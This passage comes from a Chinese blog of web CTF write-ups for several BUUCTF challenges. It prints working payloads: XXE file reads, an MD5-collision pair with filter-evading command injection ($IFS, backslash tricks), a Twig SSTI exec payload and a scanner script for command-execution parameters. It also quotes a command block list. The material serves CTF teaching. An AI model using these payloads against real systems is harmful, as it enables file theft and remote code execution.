<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;　　　　</span><br><span class="line">    $$x &#x3D; $y  ;  &#x2F;&#x2F;post 声明至当前文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;　　　 </span><br><span class="line">    $$x &#x3D; $$y;  &#x2F;&#x2F;GET型变量重新赋值为当前文件变量中以其值为键名的值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;　 &#x2F;&#x2F;传入的变量为flag   value不是flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;  </span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;   </span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TIPS-2"><a href="#TIPS-2" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit 输出一条消息，并退出当前脚本</span><br><span class="line">$$x就相当于是$($x）</span><br></pre></td></tr></table></figure>

<p>方法一</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;　　　 </span><br><span class="line">    $$x &#x3D; $$y;  &#x2F;&#x2F;GET型变量重新赋值为当前文件变量中以其值为键名的值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;　　　　</span><br><span class="line">    $$x &#x3D; $y  ;  &#x2F;&#x2F;post 声明至当前文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;  </span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line">如果单纯只看get型，我们如果传入</span><br><span class="line">?yds&#x3D;flag</span><br><span class="line">那么此时经过foreach就是$x:yds $y:flag</span><br><span class="line">接下来赋值,$yds&#x3D;$flag</span><br><span class="line">那么进行exit时就会输出$flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其他方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_62879498&#x2F;article&#x2F;details&#x2F;124586653</span><br></pre></td></tr></table></figure>

<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>发现是个登录框，抓包发现和平时的不一样</p>


<h2 id="TIPS-3"><a href="#TIPS-3" class="headerlink" title="TIPS"></a>TIPS</h2><h3 id="XEE漏洞"><a href="#XEE漏洞" class="headerlink" title="XEE漏洞"></a>XEE漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</span><br></pre></td></tr></table></figure>

<h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p>
<p>XXE主要是利用了DTD引用外部实体导致的漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">  &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">  %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

<p>这里需要注意，我们的username需要前缀&amp;和后缀;，因为我们再ENTITY中写入了名称admin（使用外部DTD），后续的可以理解为调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">引用一般实体的方法：&amp;实体名称;</span><br></pre></td></tr></table></figure>

<p>参考</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6887#toc-6</span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>先看看给的url，发现有两个参数，测试下注入没反应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;2db92ffd-cac2-4e9b-aea0-5e2a1c896022.node4.buuoj.cn:81&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure>

<p>这时候发现img这个值不知道是什么，试试解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一次base64：MzUzNTM1MmU3MDZlNjc&#x3D;</span><br><span class="line">第二次base64:3535352e706e67</span><br><span class="line">hex解码：555.png</span><br></pre></td></tr></table></figure>

<p>那是不是说明这里的内容是通过这个参数来读取图片的，是否存在包含漏洞</p>
<p>尝试将index.php进行编译传入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hex编码：696e6465782e706870</span><br><span class="line">第一次base64:Njk2ZTY0NjU3ODJlNzA2ODcw</span><br><span class="line">第二次base64：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure>

<p>得到内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>前半段时文件包含，后半段对于cmd参数进行限制</p>
<p>需要满足不能存在黑名单并且绕过md5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls</span><br><span class="line"></span><br><span class="line">绕过md5</span><br><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>



<p>最后构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;c\a\t%20&#x2F;f\l\a\g HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>发现robots.txt里面存在/fAke_f1agggg.php，发现里面放的flag是假的</p>
<p>但抓包一下发现存在一个路由</p>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;level 1</span><br><span class="line">if (isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    $num &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;level 2</span><br><span class="line">if (isset($_GET[&#39;md5&#39;]))&#123;</span><br><span class="line">   $md5&#x3D;$_GET[&#39;md5&#39;];</span><br><span class="line">   if ($md5&#x3D;&#x3D;md5($md5))</span><br><span class="line">       echo &quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;get flag</span><br><span class="line">if (isset($_GET[&#39;get_flag&#39;]))&#123;</span><br><span class="line">    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;蹇埌闈炴床浜�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现需要经过三个判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</span><br><span class="line">选择2e4，用科学计数法</span><br><span class="line">2.$a&#x3D;&#x3D;md5($a)   </span><br><span class="line">&#96;0e215962017&#96; 的 MD5 值也是由 **0e** 开头，在 PHP 弱类型比较中相等</span><br><span class="line">3.不能输入cat那用别的就好了</span><br><span class="line">tac，但发现只用tac仍不能触发，因为这里根据逻辑不能填空格。利用$IFS$9代替空格</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/4254836d9baf48039f5fca11291b403b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RldmlsYXJl,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;233b0cb2-9349-4244-bc65-93decb3b84d0.node4.buuoj.cn:81&#x2F;fl4g.php?num&#x3D;2e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>在Hint中抓包发现，给了提示在cookie</p>


<p>但好像cookie一下子想试试SSTI，但发现无论是PHPSESSID还是username甚至是submit都不是注入点，然后看了其他文章，发现要先在flag页面登陆才有一个user参数</p>




<p>测试发现确实存在SSTI</p>


<p>但发现好像存在过滤，使用system会回显What do you want to do</p>
<p>但既然存在SSTI那么就可以用这个图判断，语言是php，那这里就是Twig</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/61b42a16c2b405e6ab1ada36470713f1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Twig模块的paylaod攻击：</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>直接下载源码,但代码量巨大</p>
<p>是一个代码问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ea07b692-b70f-4608-a5d4-d148153174bf.node4.buuoj.cn:81&#x2F;xk0SzyKwfzw.php?Efa5BVG&#x3D;cat &#x2F;flag;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"># import re</span><br><span class="line"># import os</span><br><span class="line"># import requests</span><br><span class="line"># import time</span><br><span class="line"># import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># filepath &#x3D; r&quot;D:&#x2F;php&#x2F;phpstudy_pro&#x2F;WWW&#x2F;src&#x2F;&quot;  # 指定路径</span><br><span class="line"># os.chdir(filepath)  # 这句不懂什么意思，但是去掉之后会报错</span><br><span class="line"># files &#x3D; os.listdir(filepath)  # 陈列文件名字</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># s &#x3D; requests.session()</span><br><span class="line"># s.keep_alive &#x3D; False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># def test(file):</span><br><span class="line">#     with open(file, encoding&#x3D;&#39;utf-8&#39;) as u:</span><br><span class="line">#         gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, u.read()))</span><br><span class="line">#         posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, u.read()))</span><br><span class="line"></span><br><span class="line">#     data &#x3D; &#123;&#125;  # 获取所有的post参数</span><br><span class="line">#     params &#x3D; &#123;&#125;  # 获取所有的get参数</span><br><span class="line"></span><br><span class="line">#     for m in gets:</span><br><span class="line">#         # print(m)</span><br><span class="line">#         params[m] &#x3D; &quot;echo xxxxxx;&quot;</span><br><span class="line">#         # print(params[m])</span><br><span class="line">#     for n in posts:</span><br><span class="line">#         data[n] &#x3D; &quot;echo xxxxxx;&quot;</span><br><span class="line"></span><br><span class="line">#     url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;&quot; + file</span><br><span class="line">#     req &#x3D; s.post(url, data&#x3D;data, params&#x3D;params)</span><br><span class="line">#     req.close()</span><br><span class="line">#     req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">#     content &#x3D; req.text</span><br><span class="line">#     # print(content)</span><br><span class="line"></span><br><span class="line">#     if r&quot;xxxxxx&quot; in content:  # 首先判断回显有无xxxxxx，然后再判断是get还是post</span><br><span class="line">#         flag &#x3D; 0</span><br><span class="line">#         for a in gets:</span><br><span class="line">#             req &#x3D; s.get(url + &#39;?%s&#x3D;&#39; % a + &quot;echo xxxxxx;&quot;)</span><br><span class="line">#             content &#x3D; req.text</span><br><span class="line">#             req.close()</span><br><span class="line">#             if r&quot;xxxxxx&quot; in content:</span><br><span class="line">#                 flag &#x3D; 1</span><br><span class="line">#                 break</span><br><span class="line">#         if flag !&#x3D; 1:</span><br><span class="line">#             for b in posts:</span><br><span class="line">#                 req &#x3D; s.post(url, data&#x3D;&#123;b: &quot;echo xxxxxx;&quot;&#125;)</span><br><span class="line">#                 content &#x3D; req.text</span><br><span class="line">#                 req.close()</span><br><span class="line">#                 if r&quot;xxxxxx&quot; in content:</span><br><span class="line">#                     break</span><br><span class="line">#         if flag &#x3D;&#x3D; 1:</span><br><span class="line">#             param &#x3D; a</span><br><span class="line">#         else:</span><br><span class="line">#             param &#x3D; b</span><br><span class="line">#         print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; % param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># for i in files:</span><br><span class="line">#     test(i)</span><br><span class="line"></span><br><span class="line"># 高级版</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"># 只是一个简单的时间函数，看起来更漂亮罢了</span><br><span class="line">print(&#39;开始时间：  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">s1 &#x3D; threading.Semaphore(100)  # 这儿设置最大的线程数</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;php&#x2F;phpstudy_pro&#x2F;WWW&#x2F;src&#x2F;&quot;</span><br><span class="line">os.chdir(filePath)  # 改变当前的路径，这个还是不太懂</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5  # 设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files &#x3D; os.listdir(filePath)  # 得到该目录下所有文件的名称</span><br><span class="line">session &#x3D; requests.Session()  # 得到session()为之后的实现代码回显得取创造条件</span><br><span class="line">session.keep_alive &#x3D; False                                # 设置连接活跃状态为False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()  # 好像与锁什么的相关，但是还是不太懂，多线程开启</span><br><span 